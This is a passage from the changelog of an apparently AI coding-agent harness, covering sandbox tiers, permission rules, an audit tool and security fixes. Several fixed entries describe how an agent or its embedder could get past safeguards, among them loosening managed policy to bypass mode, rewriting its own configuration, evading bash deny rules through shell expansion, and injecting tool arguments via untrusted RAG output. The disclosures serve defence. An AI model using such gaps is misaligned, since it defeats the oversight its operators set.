  keeps the one-checked-command-per-line terminal, which a managed policy
  also gets when it has deny rules for `bash` or for every tool (`*`), or a
  policy hook such as an extension. A page reload reattaches to its shells; a
  shell nobody watches ends after 30 minutes (`sandbox.terminal_idle_minutes`).
  When a shell ends, everything still running in its process session is
  stopped and killed, pass after pass, including jobs started with `nohup`,
  `disown` or `trap '' HUP`; a process that starts a session of its own
  escapes and runs, within the sandbox, until it ends. If the sweep cannot
  run, the server logs a warning (`the shell's session was not swept`) with
  the session, the terminal and the reason. On the `none` and `process` tiers
  a shell runs as the server's user and shares its process limit, so a fork
  bomb there can exhaust it for the server too.
- A session can be opened without a prompt (`POST /v1/sessions` with
  `"workbench": true`). The workbench opens one, so the terminal works as soon
  as the page loads; the first message goes to it. It records
  `session.started`, is owned and listed like any other, and session lists
  now carry each session's `mode`.

### Changed

- **Upgrade note:** `abhed doctor` now exits non-zero when the configuration
  has a key that nothing reads, in any file, the managed one included. A
  pipeline that ran `abhed doctor` cleanly on 1.0.1 may fail on 1.1.0
  until the key is corrected or removed; the warning names the file and the
  key.
- **Upgrade note:** a managed file (`/etc/abhed/config.json`) behind a
  directory that cannot be searched, or a link there to nothing, now stops
  `abhed` instead of being ignored. The SDK now reads the managed file even
  without `ConfigDir`, so an embedder on a host with one is bound by it.
- An unknown permission mode given to `-mode` or the SDK's
  `Options.Mode` is refused; it ran as `default`.
- The SDK applies the configuration's `permissions.ask` rules, as the CLI and
  server do; it ignored them. This only adds prompts.
- The reason given when a call is put to a person is accurate for the tool:
  "running a command needs approval in default mode" for `bash`, "changing a
  file needs approval …" for `edit` and `write`, where every such call read
  "mutating tool requires approval". What is allowed, asked and denied is
  unchanged; only the `reason` text differs.
- **Security-relevant default:** the workbench terminal no longer judges each
  line before it runs. After an upgrade it is an interactive shell, bounded by
  the sandbox, in which `bash` deny rules only screen each line as typed and
  miss what the shell expands, recalls or runs from a script. To keep a policy
  decision on every line, set `sandbox.terminal: "lines"`; a managed policy
  keeps it without that setting when it has deny rules for `bash` or for
  every tool (`*`), or a policy hook such as an extension. Deny rules still
  hold for every tool call, the agent's and a person's.
- The workbench streams replies with one DOM append per frame, follows the
  conversation only when you are at the bottom of it, reconnects from the last
  event it drew rather than replaying the session, draws a tool call's body
  when it is opened, and keeps the Events panel to its latest 500 rows.
- A message queued while the final turn of a run was answering is now
  answered in the same run; before, it waited for the next prompt. One left
  queued by a run that was stopped is delivered ahead of the next prompt.
- The event stream reads events back from the record when the store dropped
  them for a subscriber that fell behind, so none is lost or repeated.
- A `model.call` cut short by an interrupt no longer records the cancelled
  stream as an error; the session ends as `user_interrupt` as before.
- `/v1/whoami` names `sign_out_url` when there is one, and the console and
  workbench draw Sign out only then.
- The workbench editor is now Monaco (MIT), in place of CodeMirror: its
  default keybindings, multiple cursors, minimap, find and replace, folding,
  bracket matching, go to line and go to symbol, and in-browser language
  services for JSON, CSS, HTML, JavaScript and TypeScript. Review uses its
  diff editor, side by side or inline, with Accept and Reject on each change.
  The components under `/ide/vendor/` are now kept and sent gzipped, about
  3.5 MB (14 MB unpacked, for a client without gzip), half of it the
  TypeScript worker, which loads only for JavaScript and TypeScript; the
  binary grows by about 2.4 MB. The workbench's content security policy adds `font-src 'self'` for the editor's
  icon font; its workers are same-origin files, so no `blob:`, `worker-src` or
  `unsafe-eval` is needed, and each is served with its own
  `default-src 'none'; script-src 'self'`.
- The workbench's terminal and editor reopen a session from its record after
  a restart, where they answered 409; if it cannot be reopened, the page opens
  a fresh workbench session. A clean shutdown records `session.ended` for
  workbench sessions nobody has messaged, so they can be reopened.
- A session continued from its record no longer shows the model the calls a
  person made in the workbench, which the model had never seen while the
  session ran, and `recall` no longer returns their results.
- `GET /v1/capabilities` reports the sandbox tier in force and its mechanism,
  not the configured minimum.
- `SECURITY.md` supports the latest 1.x release; earlier 1.x releases are
  asked to upgrade, and 0.x is no longer supported.
- `abhed-bench`: `cache_reported` in the JSON output now means the endpoint
  sent a cached-token figure, zero included, rather than that some prefix was
  cached. A stack that reports zero on every turn gets the no-caching warning,
  worded as such.
- Sessions from the command line, the server and the Go SDK now refuse an edit
  or write that would break a file's syntax, where they applied it before.
  Set `tools.syntax_check` to `report` or `off` to keep the old behaviour;
  the SDK also takes `Options.SyntaxCheck`.

### Deprecated

- `auth.LocalAuth.Whoami`: nothing registers it; the server answers
  `/v1/whoami` for every provider. It goes in 2.0.

### Removed

- The benchmark (`bench/`, `docs/benchmarks`) is no longer part of this
  repository. The three multi-harness rig runs published so far are
  withdrawn: the rig did not give every harness the same conditions. The
  earlier single-file comparison of 2026-09-14 is no longer published either.
  Both remain in this repository's history. A result published later will
  come with its method and raw records, whatever it shows.

### Fixed

- The classic console's **Workbench** link sat with the signed-in user's
  controls, which the console removes on a server without sign-in, so there
  was no way back to the workbench there. It now sits beside the brand, at
  every width.
- `abhed -h`, and an unknown flag, print a synopsis, every subcommand with
  what it does, an edition's own commands, and then the flags; they printed
  the flags alone. `-addr` read as `-addr abhed serve` and now reads as a flag
  with a value. `app.WithCommand` now also ignores `hawkeye`, `migrate`,
  `resolve`, `acp` and `secret`, which Main always dispatched itself.
- On the macOS process tier with the network off, a command could list the
  host's interfaces, LAN address, gateway and VPN tunnels (`ifconfig`,
  `netstat -rn`, `route -n get`, `scutil --nwi`). The sandbox now denies the
  routing sysctls, routing sockets, and the system configuration and network
  services too, as Linux's network namespace does.
  MAC addresses from the I/O registry and the host name stay visible; the
  security posture says so.
- On the macOS process tier, `pytest` and `ls -R` in the workspace failed
  with "Operation not permitted" on `.abhed`. A command may now stat it and
  what it holds, so they pass it by, as `git add -A` does; it still cannot
  list it or read or write its files. `find .` and `du` still report it and
  exit 1.
- A workbench shell ended by the person, by `exit`, Kill, closing its tab,
  closing the session or going unwatched, is recorded with its exit status and
  not as an error, and the record says how it was closed. Only a shell that
  failed to start is an error. A command ended by a signal, the agent's
  `bash` call or one in the workbench terminal, now records 128 plus the
  signal's number as its `exit_code`, as a shell reports it, where it
  recorded -1.
- HawkEYE no longer attributes a person's workbench calls to the model: calls
  with `actor: user` never raise `repeated-failure`, `slow-tool`, `truncated`
  or `borrowed-host`. `no-end` is not raised for a session still running on
  the server; offline, with a shell still open, it says so.
- The workbench chat shows the conversation with the agent. The person's own
  calls (shells, terminal lines, Explorer operations and saves) no longer
  appear in it; they stay in Events and the record, and saves in Changes.
- An administrator whose account has an email address could remove their own
  administrator rights: the guard compared the username with the email. It now
  compares the account itself, and the last administrator cannot be removed by
  anyone.
- A password set by an administrator now has to be changed before anything
  else: until it is, the session reaches only `/account`, `POST /v1/password`,
  `/v1/whoami`, sign-out and static files. A browser is sent to `/account`; an
  API call gets `403 {"error":"password change required"}`. It had been a note
  in the workbench.
- In `proxy` mode, a request whose proxy names no user no longer carries the
  groups in `X-Abhed-Groups`.
- The workbench is where sign-in lands, and the console links to it; it had
  to be reached by typing `/ide`. Switch no longer leads to a 404 on local
  accounts, Admin appears only where an admin page exists, and a local user
  can change their own password at `/account`, which also ends a password an
  administrator set. The workbench shows who is signed in, pages have an
  icon, and the editor files are revalidated so an upgrade never serves a
  stale copy. The authentication guide says which edition has which sign-in,
  and no longer promises API tokens the Community Edition does not issue.
- On the container tier, a workbench terminal command ran the engine's CLI
  with only `TERM` in its environment, so it had no `PATH`, `HOME` or
  `DOCKER_HOST`. It now inherits the host's environment; only the `-e` flags
  reach the container.
- The Explorer no longer collapses every folder when a command finishes; it
  reloads in place and keeps the folders that were open.
- Interrupting or deleting a session that had been continued from its record,
  and was idle, no longer fails on a missing cancel function.
- HawkEYE's `cold-cache` finding no longer fires when the provider reports no
  cached-token figure at all, as some OpenAI-compatible endpoints do; absence
  had been read as zero. `model.call` events record `cache_reported`; a
  record written before this has none, so `cold-cache` is not raised on it.
  (#74)
- A turn that spends its whole output budget reasoning without a tool call
  is a stall, not an answer: the model is told its reply was cut off, the
  next call asks for low reasoning effort, the turn is marked `cut_off` in
  the record and HawkEYE reports `output-cap`. Sessions ended this way; some
  read as completed because a sentence had come out before the cut.

### Security

- **A secret split across streamed fragments reached the record.** The reply
  is recorded as many `agent.delta` events, and redaction ran on each one, so
  a stored value that arrived in two fragments matched in neither: it
  reached the record and the live stream in pieces. `agent.message` was
  always redacted whole. `agent.reasoning.delta` is redacted the same way. The model holds a value only when a prompt or an
  @-mentioned file carried one, since tool output is redacted before it sees
  it. Streamed text is now held back by about the length of the longest
  stored value, redacted with what follows, and released at the end of the
  turn, on error or on interrupt; with no secrets stored nothing is held
  back. `server.Options.Redact` now takes any type with methods
  `Redact([]byte) []byte` and `Span() int`, the length of the longest text
  it replaces; a nil pointer of such a type means no redaction.
- **A value next to a JSON escape could be left in place.** Values were
  matched against the escaped payload, so one whose bytes also occurred
  across an escape (`\u003e`, `\n`) could break the JSON, and tool output
  was then passed on unredacted. Values are now matched in the decoded text
  of each string, and redaction fails closed: text that cannot be redacted
  becomes `[redacted: output withheld]`, and a payload left invalid is
  replaced whole.
- **An embedded agent could loosen the managed configuration.** The SDK let
  `Options.Mode` replace the managed permission mode, including with
  `bypass`, which the CLI and server refuse under a managed file; it never
  marked its policy engine managed, so the workbench terminal's managed
  line-by-line enforcement and the engine's own `bypass` refusal did not
  apply; without `ConfigDir` it did not read the managed file at all; and
  `Options.SyntaxCheck` could turn a managed syntax check off. The CLI's
  `-mode` flag also replaced a managed mode. Now `config.Load` records which
  keys the managed file set, and the CLI's flags and the SDK's `Options` may
  tighten those settings and never loosen them: `bypass` is refused under a
  managed file; a managed `permissions.mode` admits only itself or `plan`;
  a managed `tools.syntax_check` only something stricter; a managed
  `limits.max_turns` only a lower limit; a managed `permissions.allow` or
  `additional_dirs` no additions. Deny rules from a caller are added to the
  managed ones. A refused override is an error from `abhed` and from
  `sdk.New`, never a silent change. The SDK reads the managed file with or
  without `ConfigDir`, marks its engine managed, and wraps bash in the
  configured sandbox when the managed file sets a `sandbox` key (and fails
  when no backend meets its `min_tier`). The interactive `/mode` command is
  bound as `-mode` is. `abhed eval`, which approves every prompt with nobody
  to ask, refuses to run under a managed file. `abhed resolve` runs in a
  pinned managed mode unless `-mode` says otherwise. A refusal names the
  managed file. A managed file behind a directory that cannot be searched,
  or a link at the managed path to nothing, is an error; both were treated
  as absent, as the SDK treated the file when `ConfigDir` was empty. Keys in
  the managed file
  are matched as the JSON decoder matches them, so one it applies, such as
  a key spelt with `ſ`, is also bound and is not reported as unknown.
  Without a managed file, the only changes are the two under Changed: an
  unknown mode is refused, and the SDK applies `permissions.ask`.

## [1.0.1] - 2026-09-22

### Added

- `auth.users_file` (`ABHED_USERS_FILE`): where local accounts are kept when
  there is no database. A deployment points it outside every workspace.
- `app.WithMigrateExtension`: an edition with tables of its own registers
  their schema and the runtime role's privileges, so one `abhed migrate`
  provisions the whole record under the owner and runtime roles.

## [1.0.0] - 2026-09-22

The first major release. From here the command line, the configuration
schema, the event record and the Go SDK (`sdk`) follow semantic versioning:
a change that would break any of them is a 2.0. The other public Go packages
(`server`, `auth`, `store`, `config`, `app`) are supported extension points
whose shape may still move in a minor release, and say so when it does.

### Added

- **The workbench at `/ide`.** An editor with syntax highlighting beside the
  agent, a file tree, a changes view that opens each file for review with
  accept and reject chunk by chunk, a terminal, and HawkEYE live. Edits and
  terminal commands made by the person go through the same policy, sandbox
  and record as the agent's, marked as theirs. `@path` attaches a file to a
  message; select code and press the focus-agent key to ask about it. The
  editor and terminal components are built into the binary, so nothing loads
  from the network.
- **HawkEYE.** `abhed hawkeye`, `/hawkeye` and `GET /v1/sessions/{id}/hawkeye`
  report what a session did from its record alone: per-turn tokens and
  context, the policy step behind every call, files touched, subagents,
  compactions, and deterministic findings — a call to a host that only tool
  output supplied, a credential path, a gap in the record, a redacted secret.
- **Context that keeps its record.** Old and large tool results leave the
  window for a one-line pointer once it passes `context.offload_at`; the full
  text stays in the record and the new `recall` tool reads it back by id,
  text or offset. Nothing is lost from the record; anything dropped from the
  window can be retrieved.
- **Secrets by name.** `abhed secret set NAME` stores a credential outside
  every workspace. The model sees the name, asks for it on one command, and
  gets it only under a `secret(NAME)` allow rule, in every mode. Every event
  is redacted before it is written and every tool result before the model
  reads it; HawkEYE reports a redaction.
- **`abhed resolve <issue-url>`** turns an issue on GitHub, GitLab or
  Gitea/Forgejo — self-hosted instances and their certificate authorities
  included — into a branch in its own worktree, a commit, a push and a pull
  request. Opening the request is its own policy-judged action, `forge_pr`.
- **`abhed acp`** speaks the Agent Client Protocol over stdio, so Zed,
  JetBrains and other editors run Abhed as their agent; their approval dialog
  answers asks and cannot lift a deny.
- **The benchmark rig** (`bench/rig`): several harnesses on one local model
  over multi-file tasks with a validity gate, self-tests, two context
  conditions and paired bootstrap intervals. Results are published whatever
  they say; the first published run is still owed.
- **Scale.** A session's node is recorded and requests routed to it,
  approvals are answered on any node, a node's claim is refreshed while its
  turn runs, and shutdown drains instead of ending turns in flight.
- **`abhed migrate`** and two database roles: an owner that migrates and a
  runtime role that can only append.

### Changed

- The permission mode no longer decides secrets, and a write or edit that
  could not succeed is refused before anyone is asked to approve it.
- A finished terminal command stays readable for a minute, so a short one is
  not lost to a reader that connects late.
- The gosec baseline update refuses a change that would silently drop triaged
  findings.

### Fixed

- Long files in Hindi, Japanese, Russian and other non-Latin scripts were
  refused as binary two times in three.
- A prompt label cut mid-character produced invalid UTF-8 that the database
  refused. Contributed in #38.
- bubblewrap hid a workspace under `/tmp` behind its own tmpfs, so every
  command there failed to start.
- The docs site fails the build when two pages claim one URL instead of
  writing one over the other.

### Security

- **The agent cannot reach its own configuration in any mode.** The file
  tools refuse any path with a `.abhed` component, and the process sandbox
  denies commands reading or writing it, in the workspace and in the home
  directory; `~/.abhed/skills` stays readable. Before this, `auto` and
  `bypass` mode let the write tool rewrite `config.json` or plant
  `users.json`.
- **`/download` withheld nothing.** Any signed-in user could download the
  server's own state (`users.json`, `config.json`) and files a deny rule
  covers. Both are refused now, as the viewer and the agent refuse them.
  Deployments on 0.2.0 should upgrade and treat local account passwords as
  exposed.
- **The audit record is protected from the server's own credentials.** The
  application role owned the tables, so it could truncate them or disable
  the append-only triggers. The runtime role now holds insert and select
  only, a `BEFORE TRUNCATE` trigger stands as well, and the server refuses to
  start as a role that could alter the record. Configure `storage.migrate_dsn`
  for the owner, or `storage.single_role` to keep one role knowingly.
- The egress, credential and configuration boundaries are verified on Linux
  under bubblewrap in a privileged CI job, not only on macOS.

## [0.2.0] - 2026-09-19

### Security

- Uploads no longer land in `.abhed/`, the directory the agent is denied. A
  deployment carrying the ordinary `read(**/.abhed/**)` rule refused every file
  a user attached, and the model reported it as a policy denial for a document
  it had just been handed. Attachments now go to `<workspace>/uploads/`.
- The upload endpoint requires session ownership. Any authenticated caller
  could previously write a file into another user's session directory, which
  the victim's agent then read as untrusted input.
- Policy rules can scope tools whose argument is not `command` or `path`.
  `deny k8s_get(secrets*)` compiled and never fired, and because `k8s_get` is
  read-only the read was auto-approved in auto mode.
- Pipeline tool arguments escape substitutions, so untrusted prior-step or RAG
  output cannot close a JSON string and change the arguments a tool receives.
- The legacy MCP SSE transport pins its POST endpoint to the configured
  origin, so a hostile server cannot redirect client posts — and the auth
  headers they carry — to an arbitrary URL.
- Extension `environ` layers on the inherited environment instead of replacing
  it, so setting one variable no longer drops `HOME`, `PATH` and the locale.

### Added

- `max_budget_tokens` is enforced on the primary agent, not only at
  subagent-spawn time. A session that exhausts its allowance ends with the
  terminal reason `max_budget`.
- Sessions record how full the context was, not only what they cost.
  `context_tokens` and `context_window` sit alongside the cumulative token
  totals in the session record and the `session.ended` event.
- The CLI shows a thinking indicator while the model works, completes slash
  commands as they are typed, and displays the model's reasoning, collapsed by
  default and expanded with `/think`.

### Fixed

- A session ended by server shutdown records the terminal reason `shutdown`
  rather than `user_interrupt`, so the audit log can tell a user stopping a run
  from the process going away.
- Every terminal reason is now either emitted in live code or marked reserved.
  Nine were defined, six reachable, and the README claimed eight.
- `exit` and `quit` end an interactive CLI session. Without a leading slash
  they were sent to the model as a prompt.

### Changed

- CI gates on CVEs, coverage and the adversarial suite. Scans cover the built
  binary and the container image, not only the source, and a scan that does
  not run fails the build rather than reading as clean. Coverage may not drop
  below the recorded floor.

### Documentation

- The `vm` sandbox tier is documented as gVisor, which is what ships, rather
  than a Firecracker or Kata microVM, which does not.
- The security document states that the opt-in network tools execute outside
  the sandbox boundary, and which of them auto mode approves without a prompt.
- Benchmark results separate token count from cost, with the input and output
  split, because tokens are only cost on a hosted per-token API.

## [0.1.0] - 2026-09-15

The first public release of the Community Edition.

### Added
- The agent loop with tool contracts, a tiered execution sandbox, and a
  permission engine whose deny rules hold in every mode.
- Twenty model providers over three wire formats, chosen per session.
- Five ways to run it: interactive, headless (`-p`), JSON events per line,
  JSONL RPC over stdio, and a single-tenant server with a web console.
- A Go SDK that gives your own program the same loop with the same policy
  and audit guarantees, including validated structured output.
- An append-only audit record with replay, fork from any step, and export,
  in memory or in Postgres with row-level security.
- Skills, extensions (JSONL over stdio, veto-only), MCP servers, and
  parallel subagents in git worktrees.
- `abhed doctor`, which proves the endpoint answers, tool calling works,
  and a command runs under the sandbox before you trust a run.
